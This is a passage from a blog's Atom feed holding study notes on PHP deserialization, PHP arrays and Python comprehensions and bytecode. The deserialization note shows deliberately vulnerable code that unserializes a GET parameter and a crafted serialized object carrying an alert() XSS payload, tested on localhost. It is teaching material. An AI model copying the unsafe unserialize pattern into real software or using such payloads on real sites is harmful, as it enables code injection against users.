      <category term="nmap" scheme="https://prontosil.club/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化笔记</title>
    <link href="https://prontosil.club/2019/07/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/"/>
    <id>https://prontosil.club/2019/07/30/php反序列化笔记/</id>
    <published>2019-07-30T14:54:28.000Z</published>
    <updated>2019-07-30T14:56:08.639Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-反序列化"><a href="#php-反序列化" class="headerlink" title="php 反序列化"></a>php 反序列化</h1><p>先看一个栗子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"pxy"</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">"secret"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">"20"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test1 = <span class="keyword">new</span> Test();</span><br><span class="line">$object = serialize($test1);</span><br><span class="line">print_r($object);</span><br></pre></td></tr></table></figure></p><p>序列化之后得到的结果是：<br><code>O:4:&quot;Test&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;pxy&quot;;s:9:&quot;Testsex&quot;;s:6:&quot;secret&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;}</code></p><p>O代表是对象，<code>Test</code>是类名，之后是属性，不同类型的属性其实序列化之后得到的结果是不一样的。</p><p>看官方文档，解释了为什么需要序列化这种操作：</p><blockquote><p>serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。<br>这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p></blockquote><p>同时提到了一个魔术方法：</p><blockquote><p>当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 <strong>sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 </strong>wakeup() 成员函数。</p></blockquote><p><code>__sleep()</code>和<code>__wakeup()</code>两个方法很形象地说明了什么时候调用。</p><p>然后我就犯了一个新手很常见的错误：<br><code>__sleep()</code>方法必须是要返回一个<code>array</code>地<br><img src="https://i.imgur.com/pulCMhV.png" alt="php3"></p><p>原来。。<code>__sleep()</code>方法是这样子调用的啊<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"pxy"</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">"secret"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">"20"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="实际追踪一下为什么会出现反序列化"><a href="#实际追踪一下为什么会出现反序列化" class="headerlink" title="实际追踪一下为什么会出现反序列化"></a>实际追踪一下为什么会出现反序列化</h2><p>调试代码如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $target = <span class="string">"this is a test"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$c = unserialize($a);</span><br></pre></td></tr></table></figure></p><p>利用思路：传入的参数是可控的，并且这里还有一个<code>test</code>类和一个<code>__destruct()</code>魔术方法。<br>那就是构造这个对象将其序列化之后传入，之后会自动反序列化同时在对象销毁的时候就会自动执行魔术方法了</p><p>我们这样来写：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $target = <span class="string">"&lt;script&gt;alert('xss');&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line">print_r(serialize($object));</span><br></pre></td></tr></table></figure></p><p>突然觉得序列化也有一点变量覆盖的味道，我在外部构造的类实例化的对象进入代码之后覆盖了原来的对象？</p><p>调试过程如下：</p><p>生成的序列化字符串如下：<br><code>O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&quot;;}</code><br>然后将其作为参数传入进去:</p><p><code>http://localhost/test/testUnserialize0.php?b=O:4:%22test%22:1:{s:6:%22target%22;s:30:%22%3Cscript%3Ealert%28%27xss%27%29;%3C/script%3E%22;}</code></p><p>此时接收到了参数：<br><img src="https://i.imgur.com/rbponzu.png" alt="php4"><br><code>$a</code>的值为：”O:4:”test”:1:{s:6:”target”;s:30:”\<script\>alert(‘xss’);\&lt;/script>“;}”</script\></p><p>继续单步步入：<br>这个时候就会去调用魔术方法了<br><img src="https://i.imgur.com/ozQZZiw.png" alt="php5"></p><p>xss框框就弹出来啦。<br><img src="https://i.imgur.com/W3TNDdl.png" alt="xss3"></p><p>接下来继续研究剩下的魔术方法：先看几个简单的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'P2hm1n'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct()\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct()\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup()\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString()"</span>.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep()\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($funName, $argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"调用方法"</span>.$funName.<span class="string">"(:"</span>.<span class="string">"参数:"</span>;</span><br><span class="line">        print_r($argument);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"不存在！\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($funName, $argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"调用静态方法"</span>.$funName.<span class="string">"(:"</span>.<span class="string">"参数:"</span>;</span><br><span class="line">        print_r($argument);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"不存在！\n"</span>;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test1 = <span class="keyword">new</span> test();</span><br><span class="line">test::hello(<span class="string">"nihao"</span>); <span class="comment">//不实例化对象，此时调用的是静态方法</span></span><br><span class="line">$test1-&gt;hello(<span class="string">"nihao"</span>); <span class="comment">//实例化对象</span></span><br><span class="line">$test2 = serialize($test1);</span><br><span class="line"></span><br><span class="line">$test3 = unserialize($test2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>($test3);</span><br></pre></td></tr></table></figure><p>输出的结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">调用静态方法hello(:参数:Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; nihao</span><br><span class="line">)</span><br><span class="line">不存在！</span><br><span class="line">调用方法hello(:参数:Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; nihao</span><br><span class="line">)</span><br><span class="line">不存在！</span><br><span class="line">__sleep()</span><br><span class="line">__wakeup()</span><br><span class="line">__toString()</span><br><span class="line">__destruct()</span><br><span class="line">__destruct()</span><br></pre></td></tr></table></figure></p><p>这几个方法都还挺好区分的，比较难区分的就是<code>__call()</code>和<code>__callStatic()</code>方法了。</p><p>TODO<br><a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">十六个魔术方法详解</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php-反序列化&quot;&gt;&lt;a href=&quot;#php-反序列化&quot; class=&quot;headerlink&quot; title=&quot;php 反序列化&quot;&gt;&lt;/a&gt;php 反序列化&lt;/h1&gt;&lt;p&gt;先看一个栗子：&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;tabl
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php-manual-note-0</title>
    <link href="https://prontosil.club/2019/07/30/php-manual-note-0/"/>
    <id>https://prontosil.club/2019/07/30/php-manual-note-0/</id>
    <published>2019-07-30T14:52:59.000Z</published>
    <updated>2019-07-30T15:16:36.577Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-doc阅读笔记0"><a href="#php-doc阅读笔记0" class="headerlink" title="php doc阅读笔记0"></a>php doc阅读笔记0</h1><h2 id="array"><a href="#array" class="headerlink" title="array"></a>array</h2><p>数组是php的key=&gt;value映射<br>key只能是<code>integer</code>和<code>string</code>类型，value可以是任意类型</p><p>所以key会有如下强制转换：</p><ul><li>包含有合法整型值的字符串会被转换为整型。例如键名 “8” 实际会被储存为 8。但是 “08” 则不会强制转换，因为其不是一个合法的十进制数值。</li><li>浮点数也会被转换为整型，意味着其小数部分会被舍去。例如键名 8.7 实际会被储存为 8。</li><li>布尔值也会被转换成整型。即键名 true 实际会被储存为 1 而键名 false 会被储存为 0。</li><li>Null 会被转换为空字符串，即键名 null 实际会被储存为 “”。</li><li>数组和对象不能被用为键名。坚持这么做会导致警告：Illegal offset type。</li></ul><p>比如官方举例如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">  <span class="number">1</span>    =&gt; <span class="string">"a"</span>,</span><br><span class="line">  <span class="string">"1"</span>  =&gt; <span class="string">"b"</span>,</span><br><span class="line">  <span class="number">1.5</span>  =&gt; <span class="string">"c"</span>,</span><br><span class="line">  <span class="keyword">true</span> =&gt; <span class="string">"d"</span>,</span><br><span class="line">);</span><br><span class="line">var_dump($array);</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(1) &quot;d&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会导致数组的一部分值被覆盖掉</p><blockquote><p>上例中所有的键名都被强制转换为 1，则每一个新单元都会覆盖前一个的值，最后剩下的只有一个 “d”。</p></blockquote><p>同时：</p><blockquote><p>key 为可选项。如果未指定，PHP 将自动使用之前用过的最大 integer 键名加上 1 作为新的键名。</p></blockquote><p>那就会有这种结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">"a"</span>,</span><br><span class="line">  <span class="string">"b"</span>,</span><br><span class="line"><span class="number">6</span> =&gt; <span class="string">"c"</span>,</span><br><span class="line">  <span class="string">"d"</span>,</span><br><span class="line">);</span><br><span class="line">var_dump($array);</span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [0] =&gt;</span><br><span class="line">  string(1) &quot;a&quot;</span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(1) &quot;b&quot;</span><br><span class="line">  [6] =&gt;</span><br><span class="line">  string(1) &quot;c&quot;</span><br><span class="line">  [7] =&gt;</span><br><span class="line">  string(1) &quot;d&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="神奇的解引用语法"><a href="#神奇的解引用语法" class="headerlink" title="神奇的解引用语法"></a>神奇的解引用语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArray</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解引用语法</span></span><br><span class="line"></span><br><span class="line">$a = getArray()[<span class="number">0</span>];</span><br><span class="line">var_dump($a);</span><br><span class="line"><span class="keyword">list</span>(, $secondelement) = getArray();</span><br><span class="line"></span><br><span class="line">var_dump($secondelement);</span><br></pre></td></tr></table></figure><p>输出为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int(1)</span><br><span class="line">int(2)</span><br></pre></td></tr></table></figure></p><p><code>list</code>定义为：将数组中的值赋值给变量</p><h3 id="用-的语法"><a href="#用-的语法" class="headerlink" title="用[]的语法"></a>用[]的语法</h3><p>如果有一个数组 <code>$arr = array(5 =&gt; 1, 12 =&gt; 2);</code><br>那么<code>$arr[] = 56</code>相当于<code>$arr[13]=56</code></p><p>使用<code>unset</code>函数可以取消键值对映射比如<code>unset($arr[5])</code>,或者销毁一个数组<code>unset($arr)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php-doc阅读笔记0&quot;&gt;&lt;a href=&quot;#php-doc阅读笔记0&quot; class=&quot;headerlink&quot; title=&quot;php doc阅读笔记0&quot;&gt;&lt;/a&gt;php doc阅读笔记0&lt;/h1&gt;&lt;h2 id=&quot;array&quot;&gt;&lt;a href=&quot;#array&quot; c
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>python文档阅读笔记2</title>
    <link href="https://prontosil.club/2019/07/30/python%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B02/"/>
    <id>https://prontosil.club/2019/07/30/python文档阅读笔记2/</id>
    <published>2019-07-30T14:50:01.000Z</published>
    <updated>2019-07-30T14:51:49.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fluent-python-reading-notes"><a href="#fluent-python-reading-notes" class="headerlink" title="fluent python reading notes"></a>fluent python reading notes</h1><h2 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h2><p>最常见的一种写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">symboles = <span class="string">'ABC%^&amp;*#@$'</span></span><br><span class="line">beyond_ascii = [ord(s) <span class="keyword">for</span> s <span class="keyword">in</span> symboles <span class="keyword">if</span> ord(s) &gt; <span class="number">40</span>]</span><br><span class="line">print(beyond_ascii)</span><br></pre></td></tr></table></figure><p>但是也可以同时用<code>filter</code>和<code>map</code>函数来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beyond_ascii = list(filter(<span class="keyword">lambda</span> x: x &gt; <span class="number">40</span>, map(ord, symboles)))</span><br><span class="line">print(beyond_ascii)</span><br></pre></td></tr></table></figure><p>map函数将一个函数作用于list中的每一个值上，filter也是对数组中的每一个值作用一个函数，但是只返回为真的数值，python3中最后返回的是一个filter对象</p><p>比如过滤列表中的所有奇数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤出列表中的所有奇数</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">242</span>,<span class="number">45</span>,<span class="number">23</span>,<span class="number">536</span>,<span class="number">1</span>,<span class="number">325</span>,<span class="number">63635</span>,<span class="number">56335</span>]</span><br><span class="line">a_is_odd = list(filter(<span class="keyword">lambda</span> x: x % <span class="number">2</span> != <span class="number">0</span>, a))</span><br><span class="line">print(a_is_odd)</span><br></pre></td></tr></table></figure><p>再比如过滤出1~100中平方根是整数的数字<br>所谓整数就是能整除1的数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#过滤出1~100中平方根是整数的数</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">g_is = list(filter(<span class="keyword">lambda</span> x: math.sqrt(x) % <span class="number">1</span> == <span class="number">0</span>, range(<span class="number">1</span>, <span class="number">101</span>)))</span><br><span class="line">print(g_is)</span><br></pre></td></tr></table></figure><h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><p>如下是一个比较神奇的栗子，<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python解包</span></span><br><span class="line">colors = [<span class="string">'black'</span>, <span class="string">'white'</span>]</span><br><span class="line">sizes = [<span class="string">'S'</span>, <span class="string">'M'</span>, <span class="string">'L'</span>]</span><br><span class="line"><span class="keyword">for</span> tshirt <span class="keyword">in</span> (<span class="string">'%s %s'</span> % (c, s) <span class="keyword">for</span> c <span class="keyword">in</span> colors</span><br><span class="line">                                <span class="keyword">for</span> s <span class="keyword">in</span> sizes):</span><br><span class="line">    print(tshirt)</span><br></pre></td></tr></table></figure></p><p>这里用一个<code>%</code>将元组进行了拆包<br>如何很好地理解列表推导式呢？</p><p>你可以将其想象为一个函数，<code>for c in colors for s in sizes</code> 返回值是<code>(c, s)</code> 用一个<code>%</code>成功地对其进行了拆包转化为字符串形式</p><p>下面这幅图应该比较好理解<br><img src="/assets/python_dvmmoijlo.png" alt="python"></p><p>然后就有了返回值<br><img src="/assets/python0_9np9b5bvn.png" alt="python0"></p><p>当然还有这种写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b, *rst = range(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h2 id="陷阱"><a href="#陷阱" class="headerlink" title="陷阱"></a>陷阱</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">1</span>,<span class="number">2</span>, [<span class="number">30</span>, <span class="number">40</span>])</span><br><span class="line">t[<span class="number">2</span>] += [<span class="number">50</span>, <span class="number">60</span>]</span><br><span class="line">print(t)</span><br></pre></td></tr></table></figure><p>在一个不可变对象中插入了可变对象！</p><p>虽然报错但是t的值确实被修改了</p><p>对其进行反汇编或者是反编译：<br>得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="number">1</span>)</span><br><span class="line">              <span class="number">3</span> LOAD_CONST               <span class="number">2</span> (<span class="number">2</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">3</span> (<span class="number">30</span>)</span><br><span class="line">              <span class="number">9</span> LOAD_CONST               <span class="number">4</span> (<span class="number">40</span>)</span><br><span class="line">             <span class="number">12</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">15</span> BUILD_TUPLE              <span class="number">3</span></span><br><span class="line">             <span class="number">18</span> STORE_FAST               <span class="number">0</span> (t)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">21</span> LOAD_FAST                <span class="number">0</span> (t)</span><br><span class="line">             <span class="number">24</span> LOAD_CONST               <span class="number">2</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">27</span> DUP_TOP_TWO</span><br><span class="line">             <span class="number">28</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">29</span> LOAD_CONST               <span class="number">5</span> (<span class="number">50</span>)</span><br><span class="line">             <span class="number">32</span> LOAD_CONST               <span class="number">6</span> (<span class="number">60</span>)</span><br><span class="line">             <span class="number">35</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">38</span> INPLACE_ADD</span><br><span class="line">             <span class="number">39</span> ROT_THREE</span><br><span class="line">             <span class="number">40</span> STORE_SUBSCR</span><br></pre></td></tr></table></figure><p>作者提出的三个教训：</p><ol><li>不要把可变对象放在元组里面</li><li>增量赋值不是一个原子操作</li><li>查看python的字节码并不难，而且了解代码背后的运行机制很有帮助</li></ol><p>然后我们就来研究python的字节码</p><h2 id="python字节码"><a href="#python字节码" class="headerlink" title="python字节码"></a>python字节码</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><blockquote><p>LOAD_FAST一般加载局部变量的值，也就是读取值，用于计算或者函数调用传参等。<br>STORE_FAST一般用于保存值到局部变量。</p></blockquote><p>比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">61</span>          <span class="number">77</span> LOAD_FAST                <span class="number">0</span> (n)</span><br><span class="line">             <span class="number">80</span> LOAD_FAST                <span class="number">3</span> (p)</span><br><span class="line">             <span class="number">83</span> INPLACE_DIVIDE</span><br><span class="line">             <span class="number">84</span> STORE_FAST               <span class="number">0</span> (n)</span><br></pre></td></tr></table></figure><p><code>INPLACE_DIVIDE</code>就是原地除法，先加载n，然后加载p，然后除法，然后保存结果</p><p>对应的就是</p><p><code>n = n/p</code></p><blockquote><p>如何区分函数形参和其他的局部变量？</p><p>形参没有初始化，也就是从函数开始到LOAD_FAST该变量的位置，如果没有看到STORE_FAST，那么该变量就是函数形参。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">3</span> STORE_FAST               <span class="number">1</span> (local1)</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>           <span class="number">6</span> LOAD_FAST                <span class="number">1</span> (local1)</span><br><span class="line">            <span class="number">9</span> PRINT_ITEM</span><br><span class="line">           <span class="number">10</span> LOAD_FAST                <span class="number">0</span> (arg1)</span><br><span class="line">           <span class="number">13</span> PRINT_ITEM</span><br><span class="line">           <span class="number">14</span> PRINT_NEWLINE</span><br><span class="line">           <span class="number">15</span> LOAD_CONST               <span class="number">0</span> (<span class="keyword">None</span>)</span><br><span class="line">           <span class="number">18</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><p>这里<code>arg1</code>就没有<code>STORE_FAST</code><br>所以对应的源代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(arg1)</span>:</span></span><br><span class="line">    local1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">print</span> local1, arg1</span><br></pre></td></tr></table></figure><h3 id="全局变量"><a href="#全局变量" class="headerlink" 